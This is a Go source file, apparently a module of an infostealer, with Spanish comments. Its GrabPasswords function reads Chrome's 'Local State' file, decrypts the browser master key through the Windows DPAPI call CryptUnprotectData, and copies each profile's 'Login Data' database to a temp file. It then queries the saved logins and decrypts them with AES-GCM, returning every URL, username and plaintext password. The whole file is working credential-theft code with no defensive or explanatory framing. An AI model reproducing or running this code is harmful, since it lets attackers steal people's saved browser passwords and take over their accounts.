package utils

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"

	"github.com/buger/jsonparser"
	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/sys/windows"
)

// Estructura para almacenar credenciales
type UrlNamePass struct {
	Url      string
	Username string
	Pass     string
}

// Función principal para extraer contraseñas
func GrabPasswords() string {

	chromePaths := []string{
		filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
	}

	var allPasswords string

	for _, path := range chromePaths {
		if _, err := os.Stat(path); err == nil {
			passwords, success := chromeModuleStart(path)
			if success {
				for _, p := range passwords {
					allPasswords += fmt.Sprintf("URL: %s, Username: %s, Password: %s\n", p.Url, p.Username, p.Pass)
				}
			}
		}
	}

	if allPasswords == "" {
		return "No passwords found."
	}
	return allPasswords
}

// Función para manejar la extracción de credenciales
func chromeModuleStart(path string) ([]UrlNamePass, bool) {
	localStatePath := filepath.Join(path, "Local State")
	if _, err := os.Stat(localStatePath); err != nil {
		return nil, false
	}

	fileWithUserData, err := os.ReadFile(localStatePath)
	if err != nil {
		return nil, false
	}

	encryptedKey, err := jsonparser.GetString(fileWithUserData, "os_crypt", "encrypted_key")
	if err != nil {
		return nil, false
	}

	masterKey, err := decryptMasterKey(encryptedKey)
	if err != nil {
		return nil, false
	}

	var profileNames []string
	profilesWithTrash, _, _, _ := jsonparser.Get(fileWithUserData, "profile", "info_cache")
	jsonparser.ObjectEach(profilesWithTrash, func(key []byte, value []byte, dataType jsonparser.ValueType, offset int) error {
		profileNames = append(profileNames, string(key))
		return nil
	})

	var temporaryDbNames []string
	for _, profileName := range profileNames {
		dbPath := filepath.Join(path, profileName, "Login Data")
		if _, err := os.Stat(dbPath); err == nil {
			tempFile, err := os.CreateTemp("", "dbcopy-*.sqlite")
			if err != nil {
				continue
			}
			defer tempFile.Close()

			err = copyFile(dbPath, tempFile.Name())
			if err != nil {
				continue
			}
			temporaryDbNames = append(temporaryDbNames, tempFile.Name())
		}
	}

	var data []UrlNamePass
	for _, tmpDB := range temporaryDbNames {
		db, err := sql.Open("sqlite3", tmpDB)
		if err != nil {
			continue
		}
		defer db.Close()

		rows, err := db.Query("SELECT action_url, username_value, password_value FROM logins")
		if err != nil {
			continue
		}
		defer rows.Close()

		for rows.Next() {
			var actionUrl, username string
			var encryptedPassword []byte
			rows.Scan(&actionUrl, &username, &encryptedPassword)

			decryptedPassword, err := decryptPassword(encryptedPassword, masterKey)
			if err != nil {
				continue
			}

			data = append(data, UrlNamePass{
				Url:      actionUrl,
				Username: username,
				Pass:     decryptedPassword,
			})
		}
		os.Remove(tmpDB) // Elimina el archivo temporal
	}

	return data, len(data) > 0
}

// Copia archivos
func copyFile(src, dst string) error {
	input, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	return os.WriteFile(dst, input, 0644)
}

// Desencripta la clave maestra
func decryptMasterKey(encryptedKey string) ([]byte, error) {
	decodedKey, err := base64.StdEncoding.DecodeString(encryptedKey)
	if err != nil {
		return nil, err
	}

	// Add a length check
	if len(decodedKey) < 5 {
		return nil, errors.New("decoded key is too short")
	}

	if string(decodedKey[:5]) != "DPAPI" {
		return nil, errors.New("invalid master key format")
	}
	// Extraer solo la clave cifrada sin "DPAPI"
	encryptedKeyBytes := decodedKey[5:]

	var dataIn windows.DataBlob
	var dataOut windows.DataBlob

	// Asignar la clave cifrada a dataIn
	dataIn.Size = uint32(len(encryptedKeyBytes))
	dataIn.Data = (*byte)(unsafe.Pointer(&encryptedKeyBytes[0]))

	r, _, _ := syscall.NewLazyDLL("crypt32.dll").NewProc("CryptUnprotectData").Call(
		uintptr(unsafe.Pointer(&dataIn)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&dataOut)),
	)
	if r == 0 {
		return nil, errors.New("failed to decrypt master key")
	}

	// Extraer datos desencriptados
	decrypted := make([]byte, dataOut.Size)
	copy(decrypted, unsafe.Slice(dataOut.Data, dataOut.Size))
	return decrypted, nil
}

// Desencripta una contraseña utilizando la clave maestra
func decryptPassword(encryptedPassword []byte, masterKey []byte) (string, error) {
	// Add a length check
	if len(encryptedPassword) == 0 {
		return "", errors.New("empty encrypted password")
	}

	if len(encryptedPassword) < 15 || string(encryptedPassword[:3]) != "v10" {
		// If not AES-GCM, use DPAPI (for older versions)
		return decryptWithDPAPI(encryptedPassword)
	}
	// Extraer IV y el texto cifrado
	iv := encryptedPassword[3:15]     // Los siguientes 12 bytes después de "v10" son el IV
	payload := encryptedPassword[15:] // Resto de los bytes es el texto cifrado

	// Crear un nuevo bloque AES con la clave maestra
	block, err := aes.NewCipher(masterKey)
	if err != nil {
		return "", err
	}

	// Crear el modo GCM con el bloque AES
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	// Desencriptar el texto
	decrypted, err := gcm.Open(nil, iv, payload, nil)
	if err != nil {
		return "", err
	}

	return string(decrypted), nil
}

// Desencripta con DPAPI
func decryptWithDPAPI(encrypted []byte) (string, error) {
	var dataIn windows.DataBlob
	var dataOut windows.DataBlob

	dataIn.Size = uint32(len(encrypted))
	dataIn.Data = (*byte)(unsafe.Pointer(&encrypted[0]))

	r, _, _ := syscall.NewLazyDLL("crypt32.dll").NewProc("CryptUnprotectData").Call(
		uintptr(unsafe.Pointer(&dataIn)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&dataOut)),
	)
	if r == 0 {
		return "", errors.New("failed to decrypt password with DPAPI")
	}

	decrypted := make([]byte, dataOut.Size)
	copy(decrypted, unsafe.Slice(dataOut.Data, dataOut.Size))
	return string(decrypted), nil
}
